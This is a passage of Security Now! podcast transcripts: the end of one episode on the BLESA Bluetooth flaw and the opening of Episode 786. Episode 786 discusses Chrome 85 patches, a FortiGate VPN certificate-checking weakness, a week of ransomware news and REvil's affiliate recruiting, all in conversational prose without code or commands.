In their published paper last month, they wrote:  "As of June 2020, while Apple has assigned CVE-2020-9770 to the vulnerability and fixed it, the Android Bluetooth Low Energy implementation in our tested device," they said, "a Google Pixel XL running Android 10" - so we don't know about 11, which as we know just is out.  In Android 10 it was still vulnerable.  "And as for Linux-based IoT devices, the BlueZ development team said they would deprecate the part of their code that opens devices to BLESA attacks and instead use code that implements proper BLE reconnection procedures which are immune to BLESA."



So we have yet another Bluetooth Low Energy attack.  In this instance it's necessary to be present during the attempted reconnect.  So not something that is going to be a common problem for us.  You can imagine some NSA little box stuck near a lock somewhere, and it's observing and interfering with a reconnection.  When somebody brings their smartphone near the lock, they see each other.  At that moment there's a BLESA vulnerability, and they can take advantage of it, that sort of thing.



But we shouldn't be allowing that in Bluetooth Low Energy.  It should absolutely be the case that authentication is reinforced and always enforced after that initial pairing.  And what these guys found, thanks to them having formally described the protocol to a verifier, this thing managed to say, hey, you know, look over here in the spec because, if this isn't done right, you're going to have a problem.  They looked, and that's what they found.



LEO:  That's really interesting.  So these verifiers could be very useful tools.  That's really interesting.



STEVE:  Yes.  I imagine that in the future we'll be looking back on the day when we were just doing sort of seat-of-the-pants protocols as, like, what were they thinking?



LEO:  Right.



STEVE:  Because the protocols, today's protocols are complex.  And it's just too easy to miss some little interaction that makes it into the spec and then, as these guys said, all the way down the supply chain to us.  It's just it's getting too complicated for us.  We need computers to help design computers.



LEO:  Really interesting, yeah.



STEVE:  And then the network in the sky took over, and Skynet said thank you very much for turning over control of the protocol.



LEO:  We'll take it from here.



STEVE:  Yeah, we got you, we got you.



LEO:  You won't mind if we leave a few little holes in there for us.  Yeah.  So I'm actually fascinated by the whole notion of correctness in software, verifiable correctness in software.  And this is related to that, which is basically correctness in protocols.  And, now, do you have to - you have to state the protocol in some sort of highly defined language.



STEVE:  Descriptive language, yeah.



LEO:  Descriptive language.



STEVE:  So what researchers have found is that it is easy to do this at a toy level, you know, very simple protocols, very simple language.  But as soon as the protocol starts getting complex, the complexity of automated, fully automated proofs becomes incredibly difficult.



LEO:  Right.



STEVE:  It goes exponential.



LEO:  Right.  You need some rigor.



STEVE:  It's like adding bits to a binary number and seeing how the number of possibilities goes up with every bit.



LEO:  Right.



STEVE:  Well, you're adding, like, philosophies instead of bits.



LEO:  That's why it's hard to do, yeah, yeah, yeah.



STEVE:  Oh, yes.



LEO:  Interesting.  Well, my friend, we have come to the end of another emergency in Security Now!.



STEVE:  First offsite emergency podcast.



LEO:  It's the first time you've done that.



STEVE:  As the lights dim.  Yeah, in 15 years I've not had to go somewhere else.  Fortunately, I have a somewhere else now.



LEO:  Yay.  Yeah, in past years you might have been doing this from Starbucks.



STEVE:  And you can't do that today because...



LEO:  No, nobody there.  Nobody there.  784 episodes, and finally we had to go offsite.  That's pretty good.  I think you can keep that record up.  Thank you, Steve Gibson.  You'll find him at his site, GRC.com, the Gibson Research Corporation.  That's where SpinRite lives.  That's the world's best hard drive recovery and maintenance utility.  It's getting better all the time.  Getting close now to v6.1, but you'll be picking up 6.0.  But don't worry about that, you'll get a free upgrade.  Plus you'll be able to participate in the development of 6.1, so that's nice.



STEVE:  Pre-release, yes.



LEO:  Yeah, yeah.  You can also get the podcast there.  He's got 16Kb audio for the bandwidth impaired, 64Kb for those with ears.  And for those with eyes, very nicely written, human-transcribed transcripts so that you can read along as you listen.  A lot of people find that a better way to understand.  And of course it has the real benefit of it being searchable, so you can quickly find what you're looking for.  All the transcripts are online and searchable, which means if there's something Steve talked about in the last 15 years, you should be able to find it with no problem at his site:  GRC.com.  Lots of other great free stuff there.  You can leave feedback for him, questions or suggestions, at GRC.com/feedback.  He's also on Twitter, @SGgrc, and he accepts - his DMs are open, as the kids say.  So you can always leave questions, thoughts, comments:  @SGgrc.



We are at TWiT.tv.  That's the website to go to if you want to watch us do this show live of a Tuesday afternoon.  TWiT.tv/live is the feed.  That's running 24/7, audio and video.  When we're doing live shows you can watch behind the scenes.  When we're not, you can watch recordings of behind the scenes, which for many is just as good as the original behind the scenes.  On-demand versions of the show make it easy to listen at your convenience.  Just go to TWiT.tv/sn for audio and video, or watch on YouTube, or ask your Amazon Echo for Security Now!.



I have a sad note.  A number of people have written to me saying we can't listen to Security Now! on TuneIn in the U.K. anymore.  We checked into that.  And apparently due to a lawsuit by Sony and Warner Media, TuneIn has decided to pull all non-U.K. content from TuneIn in the U.K., and that included all of our shows.  So if you were a listener via TuneIn Live, which was a great thing, you could say "Play Security Now!" on TuneIn and you'd get the latest version, I apologize.  Nothing we can do about that.  But there are other providers, so there's other places to go.  Basically we try to be everywhere we possibly can so that you can get us no matter what.



Steve, we're doing - what are we doing for the holidays?  Are we going to do a best-of?  Do you want to do a best-of this year?



STEVE:  Yeah, it would be like last year, a best-of.



LEO:  Okay.  Yeah, we're collecting them.



STEVE:  You and I are going to have a meeting on Friday, and then...



LEO:  Yes.  We've got a panel event next week.  Is it next week, or two weeks?  Two weeks from now.  It's going to be good.



STEVE:  Two weeks, but we have a pre-meeting on Friday.



LEO:  Yeah, we'll get together.  That we will not broadcast.  But that's going to be a fun one because we're doing an ITProTV event.



STEVE:  Right.  



LEO:  It's "Cyber Hangover:  What the IT World's Going to Look Like Post-COVID."  I think that's a great topic.  Amy Webb is going to join us.  I don't know if you've met her, but you'll love her, super smart futurist.  Don Pezet from ITProTV.  I'll be there.  That's going to be a lot of fun.  So that's coming up October 1st.  Actually October is security month, so we have a couple events planned for October.  LastPass is doing another event, as well.



STEVE:  Very cool.



LEO:  So we're going to have a lot of fun over the next few weeks.  So I was going to mention best-ofs.  If you want to submit a best-of, TWiT.tv/bestof.  And you can leave your thoughts about a great moment that happened in the last year.



STEVE:  Yay.



LEO:  Steve, have a great week, and we'll see you next time on Security Now!.



STEVE:  Okay, buddy.  Hopefully back in my regular lair, I'm sure by then.



LEO:  We miss the blinking lights.



STEVE:  Bye.



LEO:  Bye-bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#786

DATE:		September 29, 2020

TITLE:		Zerologon++

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-786.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look back at the just-released Chrome 85.  We see that an enterprise's choice of VPN gateway really does make a difference.  We drop in for an update on what would have to be called the new ransomware gold rush, and we examine the implications of Ring's latest announcement of their flying spy drone  I mean webcam.  Then we learn how much Vitamin D Dr. Fauci takes, and invite our podcast listeners to lock down their UserID of choice at GRC's new web forums using a non-public URL.  Then we conclude with the required big update to the Zerologon story which we began last week.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about, including why it's so important to choose the right VPN, and not one that a lot of businesses are using right at this moment.  We'll also talk about the latest in ransomware.  We don't normally give you reports on ransomware issues; but, man, it's just gotten out of control.  Steve will give you an update.  And then we'll talk about this huge Windows flaw, Zerologon.  It just seems to be getting worse.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 786, recorded Tuesday, September 29th, 2020:  Zero Logon++.



It's time for Security Now!, the show where we cover your privacy and security online with this guy.  He's so secure, he's wearing tinfoil underwear:  Mr. Steve Gibson.



STEVE GIBSON:  It's hot and crinkly, Leo.



LEO:  He crinkles when he walks.



STEVE:  I do not recommend it.



LEO:  I am looking forward to it.  We're going to have so much fun next Thursday - this Thursday?  Next Thursday.  This Thursday.



STEVE:  Two days, yup.



LEO:  We're going to have an event.  We're doing it in conjunction with ITProTV.  It's called Hangover:  What IT Will Look Like After COVID.  And Steve's going to be, of course, one of our panelists with Amy Webb.  We've got Don Pezet from ITProTV to be part of this.  So it's going to be a lot of fun.  I'm really looking forward to it.  Thursday.



STEVE:  That Amy looks like she's going to be a real kick.



LEO:  Oh, you'll love Amy.  She's been on TWiT many times.  She's super smart.  I think she will be very provocative, get the thinking going.



STEVE:  So we're Episode 786 for this last podcast of September, the 29th.  I named this Zerologon++ because we introduced the problem of Zerologon last week.  And since then, OMG.



LEO:  Oh, no.



STEVE:  It has been described as the perfect Windows vulnerability, that is, if you were rating them in terms of how the bad guys liked vulnerabilities.  This thing has just exploded.  And lots of news about that.  So I thought, okay, that's a great anchor topic for the podcast.  But we're going to look back first on the release of Chrome 85 that was just happening last week.  We see that an enterprise's choice of VPN gateway really makes a difference.  We drop in for an update on what would have to be called the "new ransomware gold rush" as a consequence of the acceleration that we're seeing in attacks.



Also we have to just talk about Ring's latest announcement of their flying spy drone, I mean, webcam, because that's, like, really, guys?  Then we're going to briefly learn how much Vitamin D Dr. Fauci takes; invite our podcast listeners to lock down their userID of choice at GRC's new web forums using a non-public URL, so everybody can get their IDs before the general public; and then we're going to conclude with, boy, a big update on the Zerologon story.  And really, Leo, a fun Picture of the Week.  It's not a blank page this time, not at all.



LEO:  Let me look at it here.  Wait a minute.  What's funny about this?  Oh.



STEVE:  I highlighted something from the label up above.



LEO:  Oh.  Okay.  This is good.  This is one like a Where's Waldo for you.  And now you can explain this Photo of the Week to me.



STEVE:  Okay.  So this is a photo, for those who are not in front of a screen, of a Seagate BarraCuda hard drive, 2TB BarraCuda.  Everything looks fine.  Unless you inspect down toward the bottom of the label very closely, Leo.  You wonder why Seagate misspelled Singapore.



LEO:  Uh-oh.



STEVE:  That seems a little suspicious.



LEO:  That's a giveaway.  Singapre.



STEVE:  Or why maybe it's a product of Thalland, T-H-A-L-L-A-N-D, rather than Thailand.



LEO:  Those would be the giveaways right there.  But they're in fine print.



STEVE:  And at that point you'd be thinking, oh, not so sure I want to trust my data to this drive of unknown past.  It is the case that you can sort of see there was another label on the drive beforehand.



LEO:  Yeah, yeah, yeah.



STEVE:  And this one was put there.  But somebody went to the trouble of forging Seagate BarraCuda hard drives, complete with model numbers, serial numbers, barcodes, I mean, it looks great.



LEO:  Why didn't they just Xerox the original?  It's crazy.



STEVE:  Singapore has an "o" in it; you know?



LEO:  Yeah, "singapre."



STEVE:  But not on this drive.  So it turns out that we had some fun a while ago talking about - we've talked about counterfeit Cisco hardware.  There was that counterfeit device where the researchers kind of went off half-cocked and blamed the manufacturer, but it was actually a counterfeit of theirs that had this bad behavior.  Theirs actually didn't.  And hard drives have a similar problem.  I guess there's been some discussion in the forums about that counterfeiting is a growing problem in the electronics industry.  And when you look at this thing, I mean, it's got the Torx screws.  Somebody took I guess some other, less high-reputation hard drive.  Hopefully it has 2TB. 



LEO:  That's the other thought, yeah, maybe it's not really 2TB.  That happens, too.



STEVE:  Yeah.  You definitely want to make sure like all of those two trillion bytes are actually inside there before you start using it.  But anyway, I just thought that was - I got a kick out of this with the misspellings on the label.  And just sort of thought I would point out that it is worth carefully inspecting the things that you buy online because there's no quality control happening in the channel.  And it's sometimes very difficult to return things from third parties.  So yikes.



Last week we noted that Chrome was right on the brink of updating to their v85, but we didn't yet have all the details.  And since several of the things that were fixed were extremely serious remote code execution vulnerabilities, we still today don't have all the details, and Google won't be releasing them until they have essentially lost their value as attack vectors by virtue of everyone having updated to Chrome 85.  These are not zero-days.  That's the good news.  And Google stated that they are not aware of any of these being used in the wild.  Of course that's not the same as knowing that they are not.  But that's all we've got.



As we've observed, that updating process often occurs during a rollout which can take some time.  And Google's own Chrome releases document page about this last week starts out by saying the stable channel has been updated to 85.0.4183.121 for Windows, Mac, and Linux, so it's the desktop Chrome, clearly, which they said will roll out over the coming days/weeks.  So it might be a while.  I would urge anybody listening to this just to, you know, you can normally always induce an update by going into the About page.  I mean, I have found that often I've caught it off guard.  It goes, oh, hold on just a second, and then it spins some wheels on the screen and then invites me to reload Chrome.



But otherwise, and this is the case with Firefox also, they just don't seem, I don't know, like being preemptive about it, probably because they typically feel that this would be more of an inconvenience to the user.  How many times have we had Windows suddenly shut down on us and do an update right in the middle of a presentation or before one or something, where it's been inconvenient?



So anyway, some of the things that were fixed were vulnerabilities that could have enabled zero-click remote code execution on a visitor's machine by simply visiting a hostile site that was aware of and had weaponized the vulnerability.  We don't know yet, but even maybe a malvertising ad could have done that to people.  And this is why I talk about - this is why we have a separate section at the beginning of the podcast, typically, about browser issues, because this is arguably now the main interface that most users have to the Internet, for better and for worse.  I mean, it's the thing we stick out there in our name and hope that it turns out okay.



Google is responding quickly and appropriately, and we know they're on top of their game from a security standpoint.  But these things are just - they've become operating systems unto themselves.  And they're just that complicated.  So overall, 10 security flaws were fixed.  And I was glad to see that the top two disclosures earned their discoverers $15,000 each, with the third being rewarded $10,000.  And I think this bug bounty model, that and relying upon the ethics of those who discover these problems, has become a crucial aspect of today's threat management landscape.



I mentioned ethics because a weaponizable zero-click unknown remote code execution exploit for the world's leading web browser by a large margin could doubtless have been sold to the likes of Zerodium for a far higher price than the 15 or $20,000 that these discoverers got.  So props to them for saying, you know, I'm going to make a little bit of money here.  I'm going to feel good about myself and be able to sleep at night because I'm not selling this thing to Zerodium for them to hurt people with eventually, I mean, basically resell this to Zerodium's customers for clearly underhanded reasons.



So I placed a link to the release report in the show notes.  I tried to drill down to get additional information on these individual issues, just to see if there was anything more interesting and juicy there.  But all the pages came up "permission denied," with a banner across the top reading "Chrome Googlers, we're investigating a problem with issue permissions."  So no additional information was readily available.  So I couldn't get there.  I think they were just having some sort of a site security problem of some sort, which I thought itself was interesting.  So for now all we can do is make sure that any Chrome desktop we're using is at 85, and just be glad that these problems were found and eliminated before their use was observed in the wild, and again that good guys were releasing these things responsibly.



Even if they hadn't sold to Zerodium, the other thing we've seen are irresponsible people just tweeting them.  And it's like, okay, that's not good either because it takes Google or anybody some time, days in the best case, to get a fix figured out and up to users.  And in fact the story that we'll be talking about at the end of the podcast of the Zerologon problem, this first came to light when Secura figured six weeks had been long enough, two Patch Tuesdays, long enough for them to then provide the details, which they were no doubt really anxious to provide.  Who can blame them?  They discovered this, and it's cool.  And so that wasn't enough.  Not last week; and, whoa, not as we'll be talking about in the week since.



And so Leo, it was interesting that ExpressVPN was a sponsor because I had in my show notes here, I said:  "From time to time through the years we've had various recommendable VPN service providers as sponsors of the TWiT Network."  And of course we have one now.  I said:  "Our argument then has been that the provider you choose makes a difference."  And so this little bit of news is an example of just that. 



Two researchers who work for a network security platform provider, SAM Seamless Network, introduced their most recent discovery by explaining, they wrote:  "Many have written, and probably more will be told about the dramatic change in the way each of us works remotely following the COVID-19 pandemic."  And of course, as you said, Leo, we're going to be doing a panel about this in two days.  "As security researchers, we've been trying to assess whether the existing security solutions address the new situation.  We noticed that many companies are resulting in requiring employees to connect to the office via VPN.  Whether it's because of onsite data centers or IP anchoring, many small businesses - less than 20 employees - use a VPN server that is usually also the company's gateway.



"Not too long after we began our research, the name FortiGate was thrown into the air.  We instantly grabbed the FortiGate that we kept as a backup in the office and began exploring.  Surprisingly, or not, we quickly found that under default configuration the SSL VPN is not as protected as it should be, and is vulnerable to" - another thing you mentioned, Leo - "man-in-the-middle attacks quite easily.  The FortiGate SSL VPN client only verifies that the CA [Certificate Authority] was issued by FortiGate or another trusted CA.



"Therefore an attacker can easily" - actually, they said "CA" and they meant cert here.  And we'll get to that in a second.  "Therefore an attacker can easily present a certificate issued to a different FortiGate router without raising any flags, and implement a man-in-the-middle attack."  And they finish their introduction saying:  "We searched and found over 200,000 vulnerable businesses in a matter of minutes."



LEO:  Whoa.



STEVE:  I know.  It's just, really?  Still?  Really?  What year is this, Leo?  Oh.  Okay.  So the scenario is, as we know, employees have moved home in droves and are now connecting back to their corporate network over in this case the popular FortiGate VPN gateway, perhaps a quite recently deployed FortiGate gateway, if this was suddenly something that had to happen, you know, in March or April of this year.  They describe, these researchers, an entirely feasible scenario where a compromised IoT device in the remote user's home is able to use ARP poisoning to intercept the employee's connection back to the corporate VPN gateway and insert itself into the loop.



Now, these guys are IoT security folks, so they take the evil IoT device attack model.  In practice, such interception could be performed anywhere along the path from the employee's VPN client to the corporate VPN endpoint.  So, for example, a bonanza could be had by a serious competitor, say in corporate espionage mode, arranging to intercept their competitors' bandwidth close to but outside the company.  "Close to" so that they would be able to see a lot of the incoming connections to that company's VPN.



So the essence of the flaw that was discovered was that any device or attacker who can arrange to intercept the client's remote connection can relay their authentication to the corporate FortiGate gateway, despite its being protected by a VPN.  The FortiGate VPN gateway is an SSL VPN, so it establishes first a standard SSL/TLS connection using the client and server model that we're all quite familiar with on this podcast.  To that end, every FortiGate VPN gateway - so the gateway at the enterprise side; right? - has a unique certificate where the certificate's common name, that is, just like the name on the certificate, like the name on my certs are GRC.com.  The certificate's common name consists of the model number and serial number of that particular gateway.  Since every serial number is unique, every certificate is unique.



The trouble arises, as these guys note, when the FortiGate VPN client used with its default settings does not bother to check whether it's connecting to the correct FortiGate VPN.  It doesn't look at the connecting certificate's name at all.  It doesn't bother to check that it's connecting to any FortiGate VPN gateway.  If the certificate is valid and has been signed by any valid and recognized certificate authority that that user's PC/Mac/Linux machine, whatever it is, trusts, that's good enough for the FortiGate client.



In other words, this would be like having our web browsers not even looking at the name on the server certificates when our browsers connect to remote web servers offering services.  All that would be checked was that the certificate itself received from the web server was valid, and it was signed by someone valid.  We all know that would be totally nuts, since any sort of attack to intercept or reroute traffic, like just a DNS spoof, would allow an attacker to redirect traffic to their server, spoof the identity of the server with their own certificate, you know, a valid certificate with somebody else's name, and then go from there.



So the FortiGate VPN offers zero protection against any form of man-in-the-middle interception.  An attacker, even an IoT light bulb on the home user's LAN, simply answers the client's TLS connection with any valid certificate.  The attacker simultaneously turns around and reaches out to the Fortinet VPN gateway at the enterprise and initiates its own fresh VPN connection.  Then when the user's, the valid user's client sends its authentication credentials, right, to log into the network, after establishing what it thinks it established, a VPN connection, it's the attacker who receives those login credentials, probably records them for future use, and then forwards them to the connection it has made to the corporate gateway.



The attack then proceeds, with the attacker having access to the decrypted content of everything that moves back and forth through it.  And note that the attacker is now also on the corporate LAN, under that user's credentials.  So it can get up to all manner of other mischief while the client is online and none the wiser.  And in fact even when the client disconnects, it can maintain the connection and continue doing whatever it might want to do.



So the problem is bad, and the fix is, I mean, it's unconscionably trivial.  If the client were simply configured to verify the gateway's certificate by name, and require that that certificate be signed by the FortiGate certificate authority and none other, whose root certificate would have been installed, presumably at client setup, then any intercepting man in the middle would be locked out since they could never authenticate to the client with a FortiGate VPN server certificate because they could never make one.  They would never have the private key required to sign such a certificate.  Only FortiGate would have that.



LEO:  I wonder if this is by design, rather than a flaw.



STEVE:  Oh, boy.



LEO:  Like they want, like the businesses want to intercept or something like that; you know?



STEVE:  No, well, so I don't see that.  The only way to explain - but that's a perfect segue, Leo.  The only way to explain this clearly insecure configuration for a VPN would be that all of the concern must have been about the client authenticating themselves to the corporate LAN.  That is, well, yeah, bring up a VPN, that's great.  But mostly, once that's up, then the client is going to have to log into the corporate LAN in order to prove they are a client of the company.  And so that's necessary, but obviously that's not sufficient protection.  The clear need to have the gateway also authenticate to the client was apparently somehow missed.



So being responsible lads, the researchers reached out to the Fortinet folks to share what they had found and to get their comments.  Believe it or not, FortiGate reportedly responded that they are well aware of it, but are not going to change it.  They claim that since the user has the ability to manually replace the certificate that was provided with the system, it's the user's responsibility to make sure the connection is protected.  Wow.  And the SAM Seamless Network guys noted in their write-up, they said:  "Moreover, there is no clear warning by Fortinet to the user that this major security flaw exists when using the default certificate.  Instead, a vague message is displayed."



They concluded their posting, saying:  "We decided to take the research one step further and check how many Fortinet devices are vulnerable to this type of attack.  Using the Shodan.io database, we found approximately 230,000 FortiGate devices that are using the VPN's functionality.  Out of those, roughly 88%, that is, over 200,000 businesses are using the default configuration that can be easily breached using any man-in-the-middle method."



So of course one of my favorite aphorisms on this podcast has been "the tyranny of the default."  Right?  Fortinet's defense that their gateway can be made secure is horrifying when you consider that the security that any purchaser would assume they're obtaining when they turn on a VPN, you know, what else are they buying?  And the numbers shown from the Shodan scan that indeed 88% of all the identified installations are using the insecure default, demonstrates that Fortinet is badly letting their customers down.  So, wow.  I mean, it's just unconscionable.  I'm astounded by it.  And so of course I wanted to share it with our listeners.  It does matter which VPN solution you choose.



LEO:  Yeah.



STEVE:  So we have what BleepingComputer, who has, as we know, been intensely focused upon the ransomware world since it first emerged into the infosecurity scene, they've titled this the "Ransomware Gold Rush," to describe just the past week.  Lawrence Abrams has assembled a timeline of events occurring during the seven-day period from September 19th through the 25th.  So the 19th was Saturday before last, to the 25th, which was last Friday.  I want to give everyone a sense for what's actually going on here, for example, during a seven-day period in the land of ransomware.  On the 19th, Michael Gillespie and PolarToffee found a new ransomware called Egregor that appears to be a Sekhmet spinoff.  



LEO:  Oh, Sekhmet?



STEVE:  I know, the old Sekhmet.



LEO:  The old Sekhmet's at it again.



STEVE:  Duck when that thing comes at you.  It uses a random extension and drops a ransom note named RECOVER-FILES.txt.~.  Now, recall that Michael Gillespie, he's the guy who has been reverse-engineering those poorly written, but still effective on their surface, ransomware strains that permit some hope of non-ransom payment decryption.  His pages over at Bleeping Computer now contain decryptors for 23 different kind of low-end ransomware variants.  They're low-end because they can be decrypted without needing to receive the key after paying the ransom to the bad guys.



So that's who he is, and he's very involved.  He's become sort of a focal point of a lot of this intel.  So you'll hear his name a lot as I run through what happened in this one week.  As a matter of fact, he also found a different new variant of the LeakThemAll ransomware that appends .montana to encrypted files and drops a ransom note of !HELP!.txt.  GrujaRS found a new ransomware that appends the .zhen extension to encrypted files.  That was just on Saturday.  On Sunday, Michael found a new variant of the STOP ransomware that appends the .kolz (K-O-L-Z) extension to encrypted files.  Sunday was a slow day.



Monday the 21st, a new ransomware named ThunderX was discovered.  After its analysis, for those fortunate enough to look for it, a free decryptor has been created.  It gets added to the list of those that were not written well.  The trouble is, of course, many victims won't know that they could look for a decryptor for the ThunderX ransomware.  So maybe they'll end up paying ransom they didn't need to.



Also last Monday, in related news, Nathan Wyatt, previously known as the Dark Overlord, pleaded guilty and was sentenced to five years in prison for his extortion threats where he was threatening to publicly release information from his hacking victims unless they agreed to his extortion demands.  So hopefully the underworld will see that and think, ooh, maybe that's not such a good idea.



Also that day, last Monday, Michael Gillespie found a new ransomware that appends the .encrypted - not much imagination there - extension and drops a ransom note named SOLVE ENCRYPTED FILES.txt.  He also found a new variant of the Matrix ransomware that appends the .JB88 extension and drops a ransom note JB88_README.rtf.  Xiaopao found a new Nefilim (N-E-F-I-L-I-M) variant that appends the .TRAPGET extension and drops a ransom note named TRAPGET-INSTRUCTION.txt.



Which brings us to Tuesday of last week.  Luxottica, the Italian owner of the Ray-Ban brand, has confirmed that they were the victim of a ransomware attack.



LEO:  Good.



STEVE:  Which has disrupted work, shutting down operations in Italy and China.



LEO:  Luxottica is the worst monopolist ever.  They bought up every glasses brand there is.  Not just Ray-Ban, everything.  And they then raised the prices on frames to hundreds of dollars.  So sometimes you don't mind.



STEVE:  Well, I guess maybe they have the money to pay.



LEO:  Oh, they do, yes.



STEVE:  I think they're going to because one imagines maybe their IT staff is not topnotch.  Anyway, meanwhile, and this is interesting, a provider of cyber insurance has begun performing their own security scans during their initial underwriting phase.  So they're saying, yeah, we'll agree to cover you, but first we're going to check your security ourselves to see if we find anything obviously wrong.



LEO:  Of course.



STEVE:  Since they, yeah, since they've been doing this they're reporting a 65% reduction in subsequent ransomware claims being made against their clients.  Yeah.  And Michael Gillespie found a new Matrix variant that appends the .FG69 extension and drops a ransom note named FG69_README.rtf.  The source for this stuff has to be out in the wild so that script kiddies are just, like, renaming a few things and then launching it themselves.  Xiaopao found a new Matrix ransomware variant that appends the .AW46 extension and drops a ransom note named !AW46_INFO!.rtf.  GrujaRS found a new ransomware that appends the .CRPTD extension to encrypted files, and 3xp0rt found a ransomware actor selling a complete ransomware kit - ah, there we go - for $2,000.



Which brings us to Wednesday of last week.  A leading government technology services provider, Tyler Technologies, has suffered a ransomware attack that has disrupted its operations.  We've talked about the problems QNAP NAS devices have been having.  Now they've been targeted by the AgeLocker ransomware, which encrypts the device's data and in some cases steals the victim's files, as well.  A new ransomware group has been targeting large corporate networks using backdoors of their own design and file-encrypting malware for the initial and final stages of the attack.



Joakim Kennedy found a new ransomware written in Golang that is pretending to be REvil.  What's odd about it is that there's no way for its victims to recover their files since there's no contact information provided.  So, yeah.  Researchers think that perhaps it's just a wiper dressed up as ransomware for some reason. 



Which brings us to Thursday the 24th.  A new ransomware campaign named Mount Locker, and I have a feeling we'll be hearing more about this, is underway.  It exfiltrates its victims' files before encrypting them and is then demanding multimillion-dollar ransoms.  I saw one ransom note from Mount Locker in some other coverage for $2 million.



LEO:  Wow.



STEVE:  Someone named S!ri with an exclamation mark for the first "i" found the new Dusk v1.0 ransomware that drops a ransom note named !#!READ-ME!#!.txt.  And JAMESWT found a sample of the new Exorcist 2.0 ransomware.  Which brings us to and concludes with Friday.  Michael Gillespie found a new STOP variant that appends the .copa extension to encrypted files.  He also found another new Matrix variant that appends the .DEUS extension and drops a ransom note named DEUS_INFO.rtf.



So, there's just one week in the life of the ransomware world.  But it should give everyone a sense for just how totally crazy and out of control this new bitcoin-enabled cyber-extortion has become.



LEO:  There's a hospital system, UHS.



STEVE:  Yes, that's our story after the next one.



LEO:  Okay.  I don't want to steal your thunder, yeah.  But wow.  UHS.  It's big.  Really big.



STEVE:  Yup.  We'll get there in one second.  But first we've got - because that's Ryuk.  We also have REvil.



LEO:  It's spelled REvil; right?



STEVE:  Right, exactly.  Capital R...



LEO:  I wonder if they mean it to be Evil.



STEVE:  Yes.  Yes.



LEO:  Yes, I believe they do.



STEVE:  And its actual name is Sodinokibi.  You'll recall we've talked about this before.



LEO:  Oh, yeah, yeah, I remember that one, yeah.



STEVE:  Yeah.



LEO:  And hackers don't name these, as you point out; right?  Security researchers name them, usually.



STEVE:  Right.  And typically it's from something that's found in the file itself.  It'll be like, for some reason, like the researchers are trying to - they need to give it a moniker of some sort so that they can talk about it.  So they're like looking around.  And typically something will stand out.  There'll be something unique about it where they go, okay, let's call this, I mean, who knows what Sodinokibi was.  But that's the name.



LEO:  So some string that was in the code or something like that.



STEVE:  Right, right.  So these guys are - they're using that ransomware-as-a-service model.



LEO:  Oh, Jesus.



STEVE:  And they, yeah, they recently deposited $1 million in bitcoin into a Russian-speaking hacker forum to demonstrate to potential affiliates that they're soliciting that they mean business.



LEO:  Wow.



STEVE:  Meaning that there is money to be made by joining their affiliate program.  Okay.  So just to back up a bit, we've covered it because we covered this when this happened.  An increasing number of ransomware operations are being conducted as ransomware-as-a-service, where the ransomware developers develop and provide the ransomware and also maintain and run the extortion payment site.  And then affiliates are recruited to actually do the hacking into businesses and use the software provided by the developers to conduct the attack.  And in a smart move, the ransomware developers typically receive a modest 20 to 30% cut, and the affiliate gets the balance of 70 to 80 percent of whatever ransom payment they're able to negotiate.



So, and we talked about this at the time.  At one point this REvil gang that is using the Sodinokibi ransomware had closed their site to new affiliates, stating that they had all they needed, thanks very much, we're good.  That changed yesterday when the gang announced that they were once again recruiting new affiliates to distribute their ransomware.  Their posting indicates that they're seeking teams of skilled hackers at penetration or experienced individuals.



In their posting they said:  One, teams that already have experience and skills in penetration testing, working with msf - I'm sure that's Microsoft - cs, koadic, nas, tape, hyper-v, and analogs of the listed software and devices; or people who have experience, but do not have access to work.  Which I thought was interesting.  It's like, oh, we have some unemployed hackers, do we?  Oh, we'll give them something to do.



So as I noted at the top, to show potential affiliates that they mean business, REvil has deposited 99 bitcoins, approximately a million dollars, on the hacker forum.  This particular hacker forum allows members to deposit bitcoins into a wallet hosted by the site.  Members can see other members' deposits, and the deposited bitcoins can be used to privately buy and sell illicit services or data through the forum.  Right?  So it sort of functions as an exchange.  And as of their posting, REvil now has 99 bitcoins deposited and on view in their hacker forum.



And what's interesting is that this deposit is also meant to demonstrate how much money ransomware operations are generating since they're publicly making a $1 million deposit as if it's no big deal.



LEO:  Well, they're not giving it away, though.  They're keeping it.



STEVE:  Well, except it shows they're not very concerned that the forum's administrators could steal it.



LEO:  Oh, that's true, yeah.



STEVE:  Because they could.  The hacker forums - and of course a hacker forum, as they say, there's no honor among thieves.



LEO:  Welcome to the hacker forum.  But you've seen, I think it's in Vegas, maybe it's in Reno, in Binion's Casino they have a million dollars under plexiglass.  And it's the same exact thing, like see what you could win.  It just gets your blood going.  See what you could get.  See what you could earn.



STEVE:  Yup.  Yup.  So unfortunately I think it is the case that ransomware is here to stay.  I mean, it has set itself up as, I mean, remember back in the quaint days at the beginning of the podcast, Leo, when we were talking about email worms or email viruses.  And it's like, oh, you know.  You don't want one of those.  And we were like, I wonder why anyone bothers to do that?



LEO:  Yeah, it was just - it was like vandalism in those days. 



STEVE:  It was a kind of a hobby to see maybe if you could get your name in the tech press or something.  Now, thanks to bitcoin, there's money in them that malware.



LEO:  That's a really good point, the idea that you can get anonymous - you would have to go to the 7-Eleven and buy a bunch of payment coupons.



STEVE:  Yeah, I mean, and remember it used to be like Western Union.  The FBI would track down Western Union payments and nab people.  And so it's bitcoin which has facilitated this dark industry because now it's possible to move money through a public blockchain, which we didn't have before.



LEO:  Is it fair to blame the IT guys at these companies?  Like it's not that easy to mitigate this stuff.



